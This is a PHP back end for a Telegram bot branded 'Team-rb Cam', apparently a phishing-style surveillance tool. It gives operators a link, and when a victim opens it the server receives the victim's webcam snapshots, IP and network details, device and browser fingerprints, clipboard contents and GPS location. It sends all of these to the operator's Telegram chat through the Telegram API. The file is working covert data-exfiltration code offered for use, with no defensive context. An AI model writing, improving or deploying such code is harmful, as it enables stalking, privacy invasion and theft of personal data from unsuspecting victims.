<?php
session_start();
$token = "https://google.com";
$domain = "12345678910111213141516";

include 'telegram.php';
$input = file_get_contents('php://input');
$telegram = new Telegram($token);

//Don't edit this...

function getIP(){
	$ip = "IP not found";
	if(!empty($_SERVER['HTTP_CLIENT_IP'])){
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	}else if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}else{
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}

if(!empty($input)){
	$update = json_decode($input);
	$message = $update->message;	
	$chat_id = $message->chat->id;
	$user_name = "*".$message->chat->first_name." ".$message->chat->last_name."*";
	$text = $message->text;
	
	$link = '*Your Link:*'.PHP_EOL.'`'.$domain.'/index.php?id='.$chat_id.'`';
	$welcome = 'Hello '.$user_name.','.PHP_EOL.PHP_EOL.'Welcome to *Team-rb Cam*'.PHP_EOL.'Powered by [Team-rb](https://t.me/rulebreaker13)'.PHP_EOL.PHP_EOL.$link;
    if($text == '/rb'){
		$telegram->sendMessage($chat_id , $welcome);
	}else{
		$telegram->sendMessage($chat_id , $link);
	}
}

if(isset($_SESSION['id'])){
	$id = $_SESSION['id'];
	
	if(isset($_POST['cat'])){
		$img = 'img'.date('dMYHis').'jpeg';
		$imageData = $_POST['cat'];
		$filteredData = substr($imageData, strpos($imageData, ",")+1);
		$unencodedData = base64_decode($filteredData);
        $fp = fopen( $img, 'wb' );fwrite( $fp, $unencodedData); fclose( $fp );
		$photo = $domain.'/'.$img;
		$telegram->sendPhoto($id , $photo);
		unlink($img);
        exit();
	}
	
	if(isset($_POST['networkinformation'])){
		$networkinformation = $_POST['networkinformation'];
		$parts  = explode(' ',$networkinformation);
		$text = "*Network Information:*".PHP_EOL.PHP_EOL."*Network IP:* ".getIP().PHP_EOL."*Network type:* ".$parts[3].PHP_EOL."*Downlink:* ".$parts[6];
		$telegram->sendMessage($id , $text);
	}
	
	if(isset($_POST['batterypercentage'],$_POST['ischarging'],$_POST['width'],$_POST['height'],$_POST['platform'],$_POST['devicelang'],$_POST['deviceram'],$_POST['cpuThreads'])){
		$text = "*Device Information:*".PHP_EOL.PHP_EOL."*Width:* ".$_POST['width'].PHP_EOL."*Height:* ".$_POST['height'].PHP_EOL."*Platform:* ".$_POST['platform'].PHP_EOL."*Devicelang:* ".$_POST['devicelang'].PHP_EOL."*Ram:* ".$_POST['deviceram'].PHP_EOL."*Battery:* ".$_POST['batterypercentage'].PHP_EOL."*Charging:* ".$_POST['ischarging'].PHP_EOL."*CPU Threads:* ".$_POST['cpuThreads'];
	    $telegram->sendMessage($id , $text);
	}
	
	if(isset($_POST['iscookieEnabled'],$_POST['useragent'],$_POST['localtime'])){
		$text = "*Browser Information:*".PHP_EOL.PHP_EOL."*Cookie Enabled:* ".$_POST['iscookieEnabled'].PHP_EOL."*Useragent:* ".$_POST['useragent'].PHP_EOL."*Localtime:* ".$_POST['localtime'].PHP_EOL."*Referurl:* ".$_POST['referurl'];
		$telegram->sendMessage($id , $text);
	}
	
	if(isset($_POST['clipboard'])){
		$text = "*Clipboard:*".PHP_EOL.$_POST['clipboard'];
		$telegram->sendMessage($id , $text);
	}
	
	if(isset($_POST['gps'])){
		$gps = $_POST['gps'];
		if($gps != "Location Permission Denied"){
			$parts  = explode(' ',$gps);
			file_get_contents('https://api.telegram.org/bot'.$token.'/sendLocation?chat_id='.$id.'&latitude='.$parts[2].'&longitude='.$parts[5]);
		}
	}
}
?>
